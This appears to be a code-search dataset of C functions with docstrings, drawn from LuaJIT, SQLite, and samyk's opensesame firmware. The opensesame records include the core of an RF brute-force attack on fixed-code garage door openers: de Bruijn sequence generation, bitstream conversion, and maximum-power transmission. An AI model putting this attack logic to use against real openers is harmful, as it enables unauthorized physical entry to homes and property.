{"docstring": "/* Classify a C type. */\n", "func_signal": "static void ccall_classify_ct(CTState *cts, CType *ct, int *rcl, CTSize ofs)", "code": "{\n  if (ctype_isarray(ct->info)) {\n    CType *cct = ctype_rawchild(cts, ct);\n    CTSize eofs, esz = cct->size, asz = ct->size;\n    for (eofs = 0; eofs < asz; eofs += esz)\n      ccall_classify_ct(cts, cct, rcl, ofs+eofs);\n  } else if (ctype_isstruct(ct->info)) {\n    ccall_classify_struct(cts, ct, rcl, ofs);\n  } else {\n    int cl = ctype_isfp(ct->info) ? CCALL_RCL_SSE : CCALL_RCL_INT;\n    lua_assert(ctype_hassize(ct->info));\n    if ((ofs & (ct->size-1))) cl = CCALL_RCL_MEM;  /* Unaligned. */\n    rcl[(ofs >= 8)] |= cl;\n  }\n}", "path": "luajit/src/lj_ccall.c", "commit_date": "2014-01-16 00:00:00", "repo_name": "LuaDist/luajit", "stars": 565, "license": "other", "language": "c", "size": 10992}
{"docstring": "/* Call section initializer and set the section offset and size. */\n", "func_signal": "static void gdbjit_initsect(GDBJITctx *ctx, int sect, GDBJITinitf initf)", "code": "{\n  ctx->startp = ctx->p;\n  ctx->obj.sect[sect].ofs = (uintptr_t)((char *)ctx->p - (char *)&ctx->obj);\n  initf(ctx);\n  ctx->obj.sect[sect].size = (uintptr_t)(ctx->p - ctx->startp);\n}", "path": "luajit/src/lj_gdbjit.c", "commit_date": "2014-01-16 00:00:00", "repo_name": "LuaDist/luajit", "stars": 565, "license": "other", "language": "c", "size": 10992}
{"docstring": "/* Initialize .debug_info section. */\n", "func_signal": "static void LJ_FASTCALL gdbjit_debuginfo(GDBJITctx *ctx)", "code": "{\n  uint8_t *p = ctx->p;\n\n  DSECT(info,\n    DU16(2);\t\t\t/* DWARF version. */\n    DU32(0);\t\t\t/* Abbrev offset. */\n    DB(sizeof(uintptr_t));\t/* Pointer size. */\n\n    DUV(1);\t\t\t/* Abbrev #1: DW_TAG_compile_unit. */\n    DSTR(ctx->filename);\t/* DW_AT_name. */\n    DADDR(ctx->mcaddr);\t\t/* DW_AT_low_pc. */\n    DADDR(ctx->mcaddr + ctx->szmcode);  /* DW_AT_high_pc. */\n    DU32(0);\t\t\t/* DW_AT_stmt_list. */\n  )\n\n  ctx->p = p;\n}", "path": "luajit/src/lj_gdbjit.c", "commit_date": "2014-01-16 00:00:00", "repo_name": "LuaDist/luajit", "stars": 565, "license": "other", "language": "c", "size": 10992}
{"docstring": "// prepare our transmission and keep the end for\n// the next transmission as the delay between packets\n// may prevent the de bruijn exploit from working\n", "func_signal": "void doTx()", "code": "{\n\t// don't modify realbuf until we're done transmitting\n\t// previous data since we're using DMA to TX\n\twaitForTx();\n\n\t// modify our realbuf to the real sequence of bits we need to send\n\tconvert_bits();\n\n\t// begin transmitting\n\trftx();\n}", "path": "opensesame/rf.c", "commit_date": "2015-06-04 00:00:00", "repo_name": "samyk/opensesame", "stars": 818, "license": "gpl-2.0", "language": "c", "size": 56}
{"docstring": "/* print inverted string on screen (dark background) */\n", "func_signal": "void printrl(u8 line, char *str)", "code": "{\n\treverseTxt = 1;\n\tprintlc(line, 0, str);\n\treverseTxt = 0;\n}", "path": "opensesame/display.c", "commit_date": "2020-12-05 00:00:00", "repo_name": "samyk/opensesame", "stars": 818, "license": "gpl-2.0", "language": "c", "size": 56}
{"docstring": "// show nyancat while transmitting\n", "func_signal": "void waitForTx()", "code": "{\n\twhile (!txdone)\n\t{\n\t\tif (!txFast)\n\t\t{\n\t\t\t// this slows down the tx quite a bit\n\t\t\ttitle;\n\t\t\tfb_blank();\n\t\t\tfb_bitblt((__xdata u8*) nyan[ni++], 30, 20, 0);\n\t\t\tfb_flush();\n\t\t\t//printl(0, \"      OpenSesame    \");\n\t\t\ttitle;\n\t\t\tprintl(1, \"     Transmitting   \");\n\t\t\tif (ni >= NYANS)\n\t\t\t\tni = 0;\n\t\t}\n\t}\n}", "path": "opensesame/opensesame.c", "commit_date": "2015-06-04 00:00:00", "repo_name": "samyk/opensesame", "stars": 818, "license": "gpl-2.0", "language": "c", "size": 56}
{"docstring": "// converts our bits to the actual bitstream/modulation the garage expects\n", "func_signal": "void convert_bits()", "code": "{\n\tu8 tlen;\n\tu16 z;\n\tu32 tb;\n\n\t// pull in last X bits of last transmission\n\tif (!firstTx)\n\t{\n\t\t// let's keep last bits (10) * len (4) since we may have broken the true code up during this delay\n\t\tfor (tmpi = 0; tmpi < codelen; tmpi++)\n\t\t{\n//printf(\"s=%d cl=%d len=%d realbuf[%d] = rb[%d]\\n\", s, codelen, len, tmpi,\n//\t\t\t(int)(ceilf((s*len)/8.0)) - codelen + tmpi);\n\t\t\trealbuf[tmpi] = realbuf[(int)(ceilf((s*len)/8.0)) - codelen + tmpi];\n\t\t\t//realbuf[tmpi] = realbuf[((s*len)/8) - codelen + tmpi];\n\t\t\t}\n\t}\n\telse\n\t\tfirstTx = 0;\n\n\t// go through each bit and convert to the garage bitstream equivalent\n\t// eg 0 = 1000, 1 = 1110\n\tfor (z = k / len; z < s; z++)\n\t{\n\t\ttb = testBit(sequence, z) ? b1 : b0;\n\n\t\ttlen = len;\n\t\twhile (tlen--)\n\t\t{\n\t\t\t// there's gotta be a better way to do this but my brain hurts right now\n\t\t\tsetBit(realbuf, (7-(k%8))+((k/8)*8), (tb >> tlen) & 1);\n\t\t\tk++;\n\t\t}\n\t}\n\n\t// start 10 bits in next time (assuming 10 bit code)\n\tk = bits * len;\n\ts = bits;\n}", "path": "opensesame/rf.c", "commit_date": "2015-06-04 00:00:00", "repo_name": "samyk/opensesame", "stars": 818, "license": "gpl-2.0", "language": "c", "size": 56}
{"docstring": "//! Get a pixel of the FB.\n", "func_signal": "u8 fb_getpixel(u16 i, u16 j)", "code": "{\n  return \n    (fbuffer[(j*FBWIDTH+i)/8] & (1<<(i&7)))\n    ?1:0;\n}", "path": "opensesame/fbuffer.c", "commit_date": "2015-06-04 00:00:00", "repo_name": "samyk/opensesame", "stars": 818, "license": "gpl-2.0", "language": "c", "size": 56}
{"docstring": "/* sdcc provides printf if we provide this */\n", "func_signal": "PUTCHAR_TYPE putchar(char c)", "code": "{\n#ifdef SIMULATOR\n\twhile (!TI); /*  wait end of last transmission */\n\tTI = 0;\n\tSBUF = c; /*  transmit to serial */\n#else\n\tu8 i;\n\n\tc &= 0x7f;\n\n\tif (c >= FONT_OFFSET)\n\t{\n\t\tfor (i = 0; i < FONT_WIDTH; i++)\n\t\t\ttxData(font[c - FONT_OFFSET][i] ^ (reverseTxt ? 0xff : 0));\n\t\ttxData(reverseTxt ? 0xff : 0x00);\n\t}\n#endif\n#ifdef PUTCHAR_INT\n  return c;\n#endif\n}", "path": "opensesame/display.c", "commit_date": "2020-12-05 00:00:00", "repo_name": "samyk/opensesame", "stars": 818, "license": "gpl-2.0", "language": "c", "size": 56}
{"docstring": "// binary de bruijn sequence -samyk\n", "func_signal": "void db(u8 t, u8 p)", "code": "{\n\tu8 j;\n\n\tif (t > bits)\n\t{\n\t\tif (bits % p == 0)\n\t\t{\n\t\t\tfor (j = 1; j <= p; j++)\n\t\t\t{\n\t\t\t\tsetBit(sequence, s++, a[j]);\n\n\t\t\t\t// once we have 254 bytes (may reduce because running out of space!), we need to tx due to size constraints\n\t\t\t\tif ((s + 1) * len >= MAXLEN * 8)\n\t\t\t\t\t// transmit\n\t\t\t\t\tdoTx();\n\t\t\t}\n\t\t}\n\t}\n\telse\n\t{\n\t\ta[t] = a[t-p];\n\n\t\tdb(t+1, p);\n\t\tfor (j = a[t-p] + 1; j <= (tri ? 2 : 1); j++)\n\t\t{\n\t\t\ta[t] = j;\n\t\t\tdb(t+1, t);\n\t\t}\n\t}\n}", "path": "opensesame/rf.c", "commit_date": "2015-06-04 00:00:00", "repo_name": "samyk/opensesame", "stars": 818, "license": "gpl-2.0", "language": "c", "size": 56}
{"docstring": "// from Michael Ossmann's epic IM-ME spectrum analyzer:\n", "func_signal": "void chkSleep()", "code": "{\n\tu8 i;\n\t/* go to sleep (more or less a shutdown) if power button pressed */\n\tif (sleepy)\n\t{\n\t\tclear();\n\t\tsleepMillis(1000);\n\t\tSSN = LOW;\n\t\tLCDPowerSave();\n\t\tSSN = HIGH;\n\n\t\twhile (1)\n\t\t{\n\t\t\tsleep();\n\n\t\t\t/* power button depressed long enough to wake? */\n\t\t\tsleepy = 0;\n\t\t\tfor (i = 0; i < DEBOUNCE_COUNT; i++)\n\t\t\t{\n\t\t\t\tsleepMillis(DEBOUNCE_PERIOD);\n\t\t\t\tif (keyscan() != KPWR) sleepy = 1;\n\t\t\t}\n\t\t\tif (!sleepy) break;\n\t\t}\n\n\t\t/* reset on wake */\n\t\tmain();\n\t\t//setup();\n\t\t//goto reset;\n\t}\n\n}", "path": "opensesame/opensesame.c", "commit_date": "2015-06-04 00:00:00", "repo_name": "samyk/opensesame", "stars": 818, "license": "gpl-2.0", "language": "c", "size": 56}
{"docstring": "// set FREQ registers in cc111x from a float\n", "func_signal": "void setFreq()", "code": "{\n#define fnum (u32)(g.hz * ((0x10000 / 1000000.0) / MHZ))\n\tFREQ2 = fnum >> 16;\n\tFREQ1 = (fnum >> 8) & 0xFF;\n\tFREQ0 = fnum & 0xFF;\n}", "path": "opensesame/rf.c", "commit_date": "2015-06-04 00:00:00", "repo_name": "samyk/opensesame", "stars": 818, "license": "gpl-2.0", "language": "c", "size": 56}
{"docstring": "/* non-blocking check for a keypress */\n", "func_signal": "u8 getkey()", "code": "{\n\tu8 key = keyscan();\n\n\t/* keep track of key currently pressed to avoid rapid repeating */\n\tif (key != active_key)\n\t\tactive_key = key;\n\telse\n\t\tkey = 0x00;\n\n\treturn key;\n}", "path": "opensesame/keys.c", "commit_date": "2015-06-04 00:00:00", "repo_name": "samyk/opensesame", "stars": 818, "license": "gpl-2.0", "language": "c", "size": 56}
{"docstring": "// create a de bruijn sequence according to what we want here\n", "func_signal": "void db_send()", "code": "{\n\t// set power\n\t// maximum power\n\tPA_TABLE0 = 0x00;\n\tif (g.hz <= 400000000)\n\t\tPA_TABLE1 = 0xC2;\n\telse if (g.hz <= 464000000)\n\t\tPA_TABLE1 = 0xC0;\n\telse if (g.hz <= 900000000)\n\t\tPA_TABLE1 = 0xC2;\n\telse\n\t\tPA_TABLE1 = 0xC0;\n\n\t// set frequency\n\tsetFreq();\n\tCHANNR = 0x00;\n\n\t// maximum channel bandwidth\n\tsetBaud();\n\n\tbits    = g.bits;\n\tlen     = g.len;\n\ttri     = g.tri;\n\tb0      = g.b0;\n\tb1      = g.b1;\n\tcodelen = ceilf(bits * (len / 8.0));\n\n\t// create and send our de bruijn bitstream\n\tde_bruijn();\n}", "path": "opensesame/rf.c", "commit_date": "2015-06-04 00:00:00", "repo_name": "samyk/opensesame", "stars": 818, "license": "gpl-2.0", "language": "c", "size": 56}
{"docstring": "//! Flush the FB to the LCD.\n", "func_signal": "void fb_flush()", "code": "{\n  /* This is specific to the IMME LCD, as it converts from the\n     internal bitmap format to the pixmap format of the LCD.\n     Replacing this function and altering the buffer size should be\n     sufficient to port this module to another platform. */\n  \n  u16 x, y, r;\n  u8 col;\n  \n  SSN = LOW;\n  \n  //setNormalReverse(0);\n  //erasescreen();\n  \n  for(y=0;y<FBHEIGHT;y+=8){\n    setCursor(y/8,0); //Proper row, leftmost column.\n    for(x=0;x<FBWIDTH;x++){\n      col=0;\n      for(r=0;r<8;r++){\n\tcol=(col>>1)\n\t  |(fb_getpixel(x,y+r)?0x80:0);\n      }\n      txData(col);\n    }\n  }\n  \n  SSN=HIGH;\n}", "path": "opensesame/fbuffer.c", "commit_date": "2015-06-04 00:00:00", "repo_name": "samyk/opensesame", "stars": 818, "license": "gpl-2.0", "language": "c", "size": 56}
{"docstring": "// set baudrate registers\n", "func_signal": "void setBaud()", "code": "{\n\tu8 drate_e = 0;\n\tu8 drate_m = 0;\n\tfloat m = 0;\n\n\tfor (tmpi = 0; tmpi < 16; tmpi++)\n\t{\n\n\t\tm = (g.baud * powf(2,28) / (powf(2, tmpi)* (MHZ*1000000.0))-256) + .5;\n\t\tif (m < 256)\n\t\t{\n\t\t\tdrate_e = tmpi;\n\t\t\tdrate_m = m;\n\t\t\tbreak;\n\t\t}\n\t}\n\n\t//drate = 1000000.0 * MHZ * (256+drate_m) * powf(2,drate_e) / powf(2,28);\n\n\tMDMCFG3 = drate_m;\n#ifndef MDMCFG4_DRATE_E\n#define MDMCFG4_DRATE_E 0x0F\n#endif\n\tMDMCFG4 &= ~MDMCFG4_DRATE_E;\n\tMDMCFG4 |= drate_e;\n}", "path": "opensesame/rf.c", "commit_date": "2015-06-04 00:00:00", "repo_name": "samyk/opensesame", "stars": 818, "license": "gpl-2.0", "language": "c", "size": 56}
{"docstring": "/* initiate sleep mode */\n", "func_signal": "void LCDPowerSave()", "code": "{\n\ttxCtl(STATIC_INDIC_OFF);\n\ttxCtl(DISPLAY_OFF);\n\ttxCtl(ALL_POINTS_ON); // Display all Points on cmd = Power Save when following LCD off\n}", "path": "opensesame/display.c", "commit_date": "2020-12-05 00:00:00", "repo_name": "samyk/opensesame", "stars": 818, "license": "gpl-2.0", "language": "c", "size": 56}
{"docstring": "// start the de bruijn sequence using the recursive db() function\n", "func_signal": "void de_bruijn()", "code": "{\n\t// clear a[], s\n\tfor (tmpi = 0; tmpi <= MAXBITS; tmpi++)\n\t\ta[tmpi] = 0;\n\ts = 0;\n\tfirstTx = 1;\n\n\t// begin recursive de bruijn\n\tdb(1, 1);\n\n\t// a real de bruijn wraps, but since we can't wrap time we have to send the last of the bits to complete the sequence\n\tfor (tmpi = 0; tmpi < bits-1; tmpi++)\n\t\tsetBit(sequence, s++, 0);\n\n\t// transmit anything left over\n\tdoTx();\n}", "path": "opensesame/rf.c", "commit_date": "2015-06-04 00:00:00", "repo_name": "samyk/opensesame", "stars": 818, "license": "gpl-2.0", "language": "c", "size": 56}
{"docstring": "/* print inverted string on screen (dark background)*/\n", "func_signal": "void printrlc(u8 line, u8 col, char *str)", "code": "{\n\treverseTxt = 1;\n\tprintlc(line, col, str);\n\treverseTxt = 0;\n}", "path": "opensesame/display.c", "commit_date": "2020-12-05 00:00:00", "repo_name": "samyk/opensesame", "stars": 818, "license": "gpl-2.0", "language": "c", "size": 56}
{"docstring": "/* print string on screen */\n", "func_signal": "void printlc(u8 line, u8 col, char *str)", "code": "{\n#ifdef SIMULATOR\n\tpp(str);\n#else\n\tSSN = LOW;\n\tsetCursor(line, col * 6);\n\tprintf(str);\n\tSSN = HIGH;\n#endif\n}", "path": "opensesame/display.c", "commit_date": "2020-12-05 00:00:00", "repo_name": "samyk/opensesame", "stars": 818, "license": "gpl-2.0", "language": "c", "size": 56}
{"docstring": "/* knock knock\n * - who's there\n * irq rf_vector\n * - irq rf---\n * INTERRUPTING SERVICE ROUTINE RF VECTOR COMPLETE (done transmitting)\n */\n", "func_signal": "void rf_isr_orig() __interrupt (RF_VECTOR)", "code": "{\n\t// clear the interrupt flags\n\tRFIF &= ~RFIF_IRQ_DONE;\n\tS1CON &= ~0x03;           // Clear the general RFIF interrupt registers\n\n\ttxdone = 1;\n\n\t// go idle again\n\tRFST = RFST_SIDLE;\n\tLED_RED = HIGH; // turn red led off\n}", "path": "opensesame/opensesame.c", "commit_date": "2015-06-04 00:00:00", "repo_name": "samyk/opensesame", "stars": 818, "license": "gpl-2.0", "language": "c", "size": 56}
{"docstring": "//! Clear the FB.\n", "func_signal": "void fb_blank()", "code": "{\n  u16 i;\n  for(i=0;i<FBHEIGHT*FBWIDTH/8;i++)\n    fbuffer[i]=0x00;\n}", "path": "opensesame/fbuffer.c", "commit_date": "2015-06-04 00:00:00", "repo_name": "samyk/opensesame", "stars": 818, "license": "gpl-2.0", "language": "c", "size": 56}
{"docstring": "// transmit that badboy\n", "func_signal": "void rftx()", "code": "{\n\t// wait for previous transmission to finish (if any)\n\twaitForTx();\n\n\ttxdone = 0;\n\tLED_GREEN = HIGH; // turn green led off\n\tLED_RED = LOW; // turn red led on\n\n\t// ...\n}", "path": "opensesame/opensesame.c", "commit_date": "2015-06-04 00:00:00", "repo_name": "samyk/opensesame", "stars": 818, "license": "gpl-2.0", "language": "c", "size": 56}
{"docstring": "/*\n** Argument pIn points to a character that is part of a nul-terminated\n** string. Return a pointer to the first character following *pIn in\n** the string that is not a white-space character.\n*/\n", "func_signal": "static const char *fts5ConfigSkipWhitespace(const char *pIn)", "code": "{\n  const char *p = pIn;\n  if( p ){\n    while( fts5_iswhitespace(*p) ){ p++; }\n  }\n  return p;\n}", "path": "sqlite-gui/include/sqlite3.c", "commit_date": "2020-12-10 00:00:00", "repo_name": "little-brother/sqlite-gui", "stars": 1022, "license": "gpl-2.0", "language": "c", "size": 42080}
{"docstring": "/*\n** Release a reference to an Fts5Structure object returned by an earlier\n** call to fts5StructureRead() or fts5StructureDecode().\n*/\n", "func_signal": "static void fts5StructureRelease(Fts5Structure *pStruct)", "code": "{\n  if( pStruct && 0>=(--pStruct->nRef) ){\n    int i;\n    assert( pStruct->nRef==0 );\n    for(i=0; i<pStruct->nLevel; i++){\n      sqlite3_free(pStruct->aLevel[i].aSeg);\n    }\n    sqlite3_free(pStruct);\n  }\n}", "path": "sqlite-gui/include/sqlite3.c", "commit_date": "2020-12-10 00:00:00", "repo_name": "little-brother/sqlite-gui", "stars": 1022, "license": "gpl-2.0", "language": "c", "size": 42080}
{"docstring": "/* Append the N-byte string in zIn to the end of the JsonString string\n** under construction.  Enclose the string in \"...\" and escape\n** any double-quotes or backslash characters contained within the\n** string.\n*/\n", "func_signal": "static void jsonAppendString(JsonString *p, const char *zIn, u32 N)", "code": "{\n  u32 i;\n  if( (N+p->nUsed+2 >= p->nAlloc) && jsonGrow(p,N+2)!=0 ) return;\n  p->zBuf[p->nUsed++] = '\"';\n  for(i=0; i<N; i++){\n    unsigned char c = ((unsigned const char*)zIn)[i];\n    if( c=='\"' || c=='\\\\' ){\n      json_simple_escape:\n      if( (p->nUsed+N+3-i > p->nAlloc) && jsonGrow(p,N+3-i)!=0 ) return;\n      p->zBuf[p->nUsed++] = '\\\\';\n    }else if( c<=0x1f ){\n      static const char aSpecial[] = {\n         0, 0, 0, 0, 0, 0, 0, 0, 'b', 't', 'n', 0, 'f', 'r', 0, 0,\n         0, 0, 0, 0, 0, 0, 0, 0,   0,   0,   0, 0,   0,   0, 0, 0\n      };\n      assert( sizeof(aSpecial)==32 );\n      assert( aSpecial['\\b']=='b' );\n      assert( aSpecial['\\f']=='f' );\n      assert( aSpecial['\\n']=='n' );\n      assert( aSpecial['\\r']=='r' );\n      assert( aSpecial['\\t']=='t' );\n      if( aSpecial[c] ){\n        c = aSpecial[c];\n        goto json_simple_escape;\n      }\n      if( (p->nUsed+N+7+i > p->nAlloc) && jsonGrow(p,N+7-i)!=0 ) return;\n      p->zBuf[p->nUsed++] = '\\\\';\n      p->zBuf[p->nUsed++] = 'u';\n      p->zBuf[p->nUsed++] = '0';\n      p->zBuf[p->nUsed++] = '0';\n      p->zBuf[p->nUsed++] = '0' + (c>>4);\n      c = \"0123456789abcdef\"[c&0xf];\n    }\n    p->zBuf[p->nUsed++] = c;\n  }\n  p->zBuf[p->nUsed++] = '\"';\n  assert( p->nUsed<p->nAlloc );\n}", "path": "sqlite-gui/include/sqlite3.c", "commit_date": "2020-12-10 00:00:00", "repo_name": "little-brother/sqlite-gui", "stars": 1022, "license": "gpl-2.0", "language": "c", "size": 42080}
{"docstring": "/*\n** Allocate an instance of the default tokenizer (\"simple\") at\n** Fts5Config.pTokenizer. Return SQLITE_OK if successful, or an SQLite error\n** code if an error occurs.\n*/\n", "func_signal": "static int fts5ConfigDefaultTokenizer(Fts5Global *pGlobal, Fts5Config *pConfig)", "code": "{\n  assert( pConfig->pTok==0 && pConfig->pTokApi==0 );\n  return sqlite3Fts5GetTokenizer(pGlobal, 0, 0, pConfig, 0);\n}", "path": "sqlite-gui/include/sqlite3.c", "commit_date": "2020-12-10 00:00:00", "repo_name": "little-brother/sqlite-gui", "stars": 1022, "license": "gpl-2.0", "language": "c", "size": 42080}
{"docstring": "/*\n** Determine if point (x0,y0) is beneath line segment (x1,y1)->(x2,y2).\n** Returns:\n**\n**    +2  x0,y0 is on the line segement\n**\n**    +1  x0,y0 is beneath line segment\n**\n**    0   x0,y0 is not on or beneath the line segment or the line segment\n**        is vertical and x0,y0 is not on the line segment\n**\n** The left-most coordinate min(x1,x2) is not considered to be part of\n** the line segment for the purposes of this analysis.\n*/\n", "func_signal": "static int pointBeneathLine(\n  double x0, double y0,\n  double x1, double y1,\n  double x2, double y2\n)", "code": "{\n  double y;\n  if( x0==x1 && y0==y1 ) return 2;\n  if( x1<x2 ){\n    if( x0<=x1 || x0>x2 ) return 0;\n  }else if( x1>x2 ){\n    if( x0<=x2 || x0>x1 ) return 0;\n  }else{\n    /* Vertical line segment */\n    if( x0!=x1 ) return 0;\n    if( y0<y1 && y0<y2 ) return 0;\n    if( y0>y1 && y0>y2 ) return 0;\n    return 2;\n  }\n  y = y1 + (y2-y1)*(x0-x1)/(x2-x1);\n  if( y0==y ) return 2;\n  if( y0<y ) return 1;\n  return 0;\n}", "path": "sqlite-gui/include/sqlite3.c", "commit_date": "2020-12-10 00:00:00", "repo_name": "little-brother/sqlite-gui", "stars": 1022, "license": "gpl-2.0", "language": "c", "size": 42080}
{"docstring": "/*\n** Invoke the xRollback method of all virtual tables in the\n** sqlite3.aVTrans array. Then clear the array itself.\n*/\n", "func_signal": "SQLITE_PRIVATE int sqlite3VtabRollback(sqlite3 *db)", "code": "{\n  callFinaliser(db, offsetof(sqlite3_module,xRollback));\n  return SQLITE_OK;\n}", "path": "sqlite-gui/include/sqlite3.c", "commit_date": "2020-12-10 00:00:00", "repo_name": "little-brother/sqlite-gui", "stars": 1022, "license": "gpl-2.0", "language": "c", "size": 42080}
{"docstring": "/* Set the JsonString object to an empty string\n*/\n", "func_signal": "static void jsonZero(JsonString *p)", "code": "{\n  p->zBuf = p->zSpace;\n  p->nAlloc = sizeof(p->zSpace);\n  p->nUsed = 0;\n  p->bStatic = 1;\n}", "path": "sqlite-gui/include/sqlite3.c", "commit_date": "2020-12-10 00:00:00", "repo_name": "little-brother/sqlite-gui", "stars": 1022, "license": "gpl-2.0", "language": "c", "size": 42080}
{"docstring": "/*\n** Swap all content between two VDBE structures.\n*/\n", "func_signal": "SQLITE_PRIVATE void sqlite3VdbeSwap(Vdbe *pA, Vdbe *pB)", "code": "{\n  Vdbe tmp, *pTmp;\n  char *zTmp;\n  assert( pA->db==pB->db );\n  tmp = *pA;\n  *pA = *pB;\n  *pB = tmp;\n  pTmp = pA->pNext;\n  pA->pNext = pB->pNext;\n  pB->pNext = pTmp;\n  pTmp = pA->pPrev;\n  pA->pPrev = pB->pPrev;\n  pB->pPrev = pTmp;\n  zTmp = pA->zSql;\n  pA->zSql = pB->zSql;\n  pB->zSql = zTmp;\n#ifdef SQLITE_ENABLE_NORMALIZE\n  zTmp = pA->zNormSql;\n  pA->zNormSql = pB->zNormSql;\n  pB->zNormSql = zTmp;\n#endif\n  pB->expmask = pA->expmask;\n  pB->prepFlags = pA->prepFlags;\n  memcpy(pB->aCounter, pA->aCounter, sizeof(pB->aCounter));\n  pB->aCounter[SQLITE_STMTSTATUS_REPREPARE]++;\n}", "path": "sqlite-gui/include/sqlite3.c", "commit_date": "2020-12-10 00:00:00", "repo_name": "little-brother/sqlite-gui", "stars": 1022, "license": "gpl-2.0", "language": "c", "size": 42080}
{"docstring": "/* Attempt to locate an element of the hash table pH with a key\n** that matches pKey.  Return the data for this element if it is\n** found, or NULL if there is no match.\n*/\n", "func_signal": "SQLITE_PRIVATE void *sqlite3HashFind(const Hash *pH, const char *pKey)", "code": "{\n  assert( pH!=0 );\n  assert( pKey!=0 );\n  return findElementWithHash(pH, pKey, 0)->data;\n}", "path": "sqlite-gui/include/sqlite3.c", "commit_date": "2020-12-10 00:00:00", "repo_name": "little-brother/sqlite-gui", "stars": 1022, "license": "gpl-2.0", "language": "c", "size": 42080}
{"docstring": "/*\n** json_type(JSON)\n** json_type(JSON, PATH)\n**\n** Return the top-level \"type\" of a JSON string.  Throw an error if\n** either the JSON or PATH inputs are not well-formed.\n*/\n", "func_signal": "static void jsonTypeFunc(\n  sqlite3_context *ctx,\n  int argc,\n  sqlite3_value **argv\n)", "code": "{\n  JsonParse *p;          /* The parse */\n  const char *zPath;\n  JsonNode *pNode;\n\n  p = jsonParseCached(ctx, argv, ctx);\n  if( p==0 ) return;\n  if( argc==2 ){\n    zPath = (const char*)sqlite3_value_text(argv[1]);\n    pNode = jsonLookup(p, zPath, 0, ctx);\n  }else{\n    pNode = p->aNode;\n  }\n  if( pNode ){\n    sqlite3_result_text(ctx, jsonType[pNode->eType], -1, SQLITE_STATIC);\n  }\n}", "path": "sqlite-gui/include/sqlite3.c", "commit_date": "2020-12-10 00:00:00", "repo_name": "little-brother/sqlite-gui", "stars": 1022, "license": "gpl-2.0", "language": "c", "size": 42080}
{"docstring": "/*\n** Disconnect from or destroy a dbpagevfs virtual table.\n*/\n", "func_signal": "static int dbpageDisconnect(sqlite3_vtab *pVtab)", "code": "{\n  sqlite3_free(pVtab);\n  return SQLITE_OK;\n}", "path": "sqlite-gui/include/sqlite3.c", "commit_date": "2020-12-10 00:00:00", "repo_name": "little-brother/sqlite-gui", "stars": 1022, "license": "gpl-2.0", "language": "c", "size": 42080}
{"docstring": "/*\n** Get/set the size-limit used for persistent journal files.\n**\n** Setting the size limit to -1 means no limit is enforced.\n** An attempt to set a limit smaller than -1 is a no-op.\n*/\n", "func_signal": "SQLITE_PRIVATE i64 sqlite3PagerJournalSizeLimit(Pager *pPager, i64 iLimit)", "code": "{\n  if( iLimit>=-1 ){\n    pPager->journalSizeLimit = iLimit;\n    sqlite3WalLimit(pPager->pWal, iLimit);\n  }\n  return pPager->journalSizeLimit;\n}", "path": "sqlite-gui/include/sqlite3.c", "commit_date": "2020-12-10 00:00:00", "repo_name": "little-brother/sqlite-gui", "stars": 1022, "license": "gpl-2.0", "language": "c", "size": 42080}
{"docstring": "/*\n** Collation sequence destructor function. The pCtx argument points to\n** a UCollator structure previously allocated using ucol_open().\n*/\n", "func_signal": "static void icuCollationDel(void *pCtx)", "code": "{\n  UCollator *p = (UCollator *)pCtx;\n  ucol_close(p);\n}", "path": "sqlite-gui/include/sqlite3.c", "commit_date": "2020-12-10 00:00:00", "repo_name": "little-brother/sqlite-gui", "stars": 1022, "license": "gpl-2.0", "language": "c", "size": 42080}
{"docstring": "/* Fast approximation for sine(X) for X between -0.5*pi and 2*pi\n*/\n", "func_signal": "static double geopolySine(double r)", "code": "{\n  assert( r>=-0.5*GEOPOLY_PI && r<=2.0*GEOPOLY_PI );\n  if( r>=1.5*GEOPOLY_PI ){\n    r -= 2.0*GEOPOLY_PI;\n  }\n  if( r>=0.5*GEOPOLY_PI ){\n    return -geopolySine(r-GEOPOLY_PI);\n  }else{\n    double r2 = r*r;\n    double r3 = r2*r;\n    double r5 = r3*r2;\n    return 0.9996949*r - 0.1656700*r3 + 0.0075134*r5;\n  }\n}", "path": "sqlite-gui/include/sqlite3.c", "commit_date": "2020-12-10 00:00:00", "repo_name": "little-brother/sqlite-gui", "stars": 1022, "license": "gpl-2.0", "language": "c", "size": 42080}
{"docstring": "/*\n** json_array_length(JSON)\n** json_array_length(JSON, PATH)\n**\n** Return the number of elements in the top-level JSON array.\n** Return 0 if the input is not a well-formed JSON array.\n*/\n", "func_signal": "static void jsonArrayLengthFunc(\n  sqlite3_context *ctx,\n  int argc,\n  sqlite3_value **argv\n)", "code": "{\n  JsonParse *p;          /* The parse */\n  sqlite3_int64 n = 0;\n  u32 i;\n  JsonNode *pNode;\n\n  p = jsonParseCached(ctx, argv, ctx);\n  if( p==0 ) return;\n  assert( p->nNode );\n  if( argc==2 ){\n    const char *zPath = (const char*)sqlite3_value_text(argv[1]);\n    pNode = jsonLookup(p, zPath, 0, ctx);\n  }else{\n    pNode = p->aNode;\n  }\n  if( pNode==0 ){\n    return;\n  }\n  if( pNode->eType==JSON_ARRAY ){\n    assert( (pNode->jnFlags & JNODE_APPEND)==0 );\n    for(i=1; i<=pNode->n; n++){\n      i += jsonNodeSize(&pNode[i]);\n    }\n  }\n  sqlite3_result_int64(ctx, n);\n}", "path": "sqlite-gui/include/sqlite3.c", "commit_date": "2020-12-10 00:00:00", "repo_name": "little-brother/sqlite-gui", "stars": 1022, "license": "gpl-2.0", "language": "c", "size": 42080}
{"docstring": "/*\n** Turn parser tracing on by giving a stream to which to write the trace\n** and a prompt to preface each trace message.  Tracing is turned off\n** by making either argument NULL\n**\n** Inputs:\n** <ul>\n** <li> A FILE* to which trace output should be written.\n**      If NULL, then tracing is turned off.\n** <li> A prefix string written at the beginning of every\n**      line of trace output.  If NULL, then tracing is\n**      turned off.\n** </ul>\n**\n** Outputs:\n** None.\n*/\n", "func_signal": "SQLITE_PRIVATE void sqlite3ParserTrace(FILE *TraceFILE, char *zTracePrompt)", "code": "{\n  yyTraceFILE = TraceFILE;\n  yyTracePrompt = zTracePrompt;\n  if( yyTraceFILE==0 ) yyTracePrompt = 0;\n  else if( yyTracePrompt==0 ) yyTraceFILE = 0;\n}", "path": "sqlite-gui/include/sqlite3.c", "commit_date": "2020-12-10 00:00:00", "repo_name": "little-brother/sqlite-gui", "stars": 1022, "license": "gpl-2.0", "language": "c", "size": 42080}
